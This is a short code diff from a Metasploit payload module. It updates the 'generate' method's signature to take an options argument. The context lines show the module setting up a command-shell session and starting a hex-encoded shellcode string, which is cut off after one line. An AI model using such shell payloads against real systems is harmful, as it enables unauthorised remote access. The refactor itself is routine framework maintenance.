@@ -24,7 +24,7 @@ module MetasploitModule
       'Session'       => Msf::Sessions::CommandShell))
   end
 
-  def generate
+  def generate(_opts = {})
     port    = (datastore['RPORT'] || 0).to_i
     payload =
       "\x9c\x2b\xa0\x07\x94\x1a\xc0\x0b\x92\x10\x20\x01\x90\x10\x20\x02" +
